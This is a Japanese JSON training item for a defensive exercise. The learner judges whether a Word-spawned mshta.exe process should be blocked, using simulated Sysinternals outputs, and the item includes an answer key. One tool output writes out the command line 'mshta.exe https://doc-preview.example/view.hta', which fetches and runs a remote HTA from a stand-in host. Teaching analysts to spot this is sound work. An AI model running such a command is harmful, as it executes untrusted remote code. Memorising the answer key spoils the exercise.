@@ -1,0 +1,191 @@
+{
+  "schema_version": 1,
+  "id": "PROC-WIN-LOLBIN",
+  "category": "process",
+  "platform": "windows",
+  "level": "advanced",
+  "ground_truth": "block",
+  "title": "LOLBinによる外部HTA実行",
+  "request": "稼働中のProcessを継続させますか。 ALLOW / BLOCKで判断してください。",
+  "initial_information": {
+    "Process": "mshta.exe",
+    "PID": 4200,
+    "User": "ASTER\\mori",
+    "採取時点": "2026-08-18 09:10 / 起動済み"
+  },
+  "initial_information_types": {
+    "PID": "pid",
+    "User": "username"
+  },
+  "tools": [
+    {
+      "id": "task",
+      "name": "Task Manager",
+      "description": "選択PIDのUser・CPU・Memory使用量を確認します。",
+      "output": "Name: mshta.exe\nPID: 4200\nUser: ASTER\\mori\nCPU: 1%\nMemory: 64 MiB",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Windows標準",
+      "environments": [
+        "windows"
+      ]
+    },
+    {
+      "id": "pe",
+      "name": "Process Explorer",
+      "description": "実行Path・Command Line・親Process・ロード済みDLLを確認します。",
+      "output": "Parent: WINWORD.EXE (3110)\nPID: 4200\nImage: C:\\Windows\\System32\\mshta.exe\nCommand line: mshta.exe https://doc-preview.example/view.hta\nUser: ASTER\\mori\nLoaded DLLs (抜粋):\nC:\\Windows\\System32\\kernel32.dll",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Windows / Microsoft Sysinternals・要導入",
+      "environments": [
+        "windows"
+      ],
+      "output_information": [
+        {
+          "id": "image",
+          "label": "Backing Executable",
+          "value": "C:\\Windows\\System32\\mshta.exe",
+          "data_type": "file"
+        }
+      ]
+    },
+    {
+      "id": "sig",
+      "name": "Sigcheck",
+      "description": "署名の検証状態・Publisherを確認します。PID入力ではBacking Executableが対象です。",
+      "output": "PID 4200 のBacking Executable: C:\\Windows\\System32\\mshta.exe\nVerified: Signed\nPublisher: Microsoft Windows",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Windows / Microsoft Sysinternals・要導入",
+      "environments": [
+        "windows"
+      ]
+    },
+    {
+      "id": "hash",
+      "name": "Get-FileHash",
+      "description": "SHA-256を計算します。PID入力では対応するBacking Executableが対象です。",
+      "output": "PID 4200 のBacking Executable: C:\\Windows\\System32\\mshta.exe\nAlgorithm: SHA256\nHash: fcd5b4a59d012a786c4db64f2472147b96f39333f6207543147823e573fc1761",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Windows / PowerShell標準",
+      "environments": [
+        "windows"
+      ],
+      "output_information": [
+        {
+          "id": "sha256",
+          "label": "Backing ExecutableのSHA-256",
+          "value": "fcd5b4a59d012a786c4db64f2472147b96f39333f6207543147823e573fc1761",
+          "data_type": "sha256"
+        }
+      ]
+    },
+    {
+      "id": "tcp",
+      "name": "TCPView",
+      "description": "選択PIDのSocketと相手IP・Portを確認します。",
+      "output": "mshta.exe 4200 TCP 192.0.2.25:52200 203.0.113.67:443 ESTABLISHED",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Windows / Microsoft Sysinternals・要導入",
+      "environments": [
+        "windows"
+      ],
+      "output_information": [
+        {
+          "id": "ip",
+          "label": "Remote IP",
+          "value": "203.0.113.67",
+          "data_type": "ip"
+        }
+      ]
+    },
+    {
+      "id": "autoruns",
+      "name": "Autoruns",
+      "description": "選択PIDのImageに対応する自動起動登録を検索します。PIDから対象Pathを選ぶ操作は教材のラッパーです。",
+      "output": "対象Image: C:\\Windows\\System32\\mshta.exe\n一致するLogon / Scheduled Tasks / Servicesエントリ: 0",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Windows / Microsoft Sysinternals・要導入",
+      "environments": [
+        "windows"
+      ]
+    }
+  ],
+  "references": [
+    {
+      "id": "admin",
+      "name": "Approved Administrative Path",
+      "content": "文書閲覧端末ではOfficeからの外部HTA起動を禁止。mshta.exeを使う承認業務・保守作業は登録されていない。"
+    }
+  ],
+  "external_references": [],
+  "required_evidence": [
+    "pe",
+    "admin"
+  ],
+  "explanation": "Microsoft署名のmshta.exeでも、Wordが起動し承認外HostのHTAを実行する引数は業務手順に反するため停止します。正規Binaryの悪用を実行文脈から判断します。",
+  "topic": "正規署名のSystem Binaryでも呼出し内容を確認する",
+  "summary": "正規署名のSystem Binaryでも呼出し内容を確認する",
+  "learning_objectives": [
+    "正規署名のSystem Binaryでも呼出し内容を確認する"
+  ],
+  "decision_context": "running_process",
+  "scenario_type": "real_world_inspired",
+  "sources": [
+    "https://attack.mitre.org/techniques/T1218/005/"
+  ],
+  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。攻撃コマンドのPayloadは<TRAINING-PLACEHOLDER>に置換。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。",
+  "inspired_by": "LOLBin / Living-off-the-Land"
+}
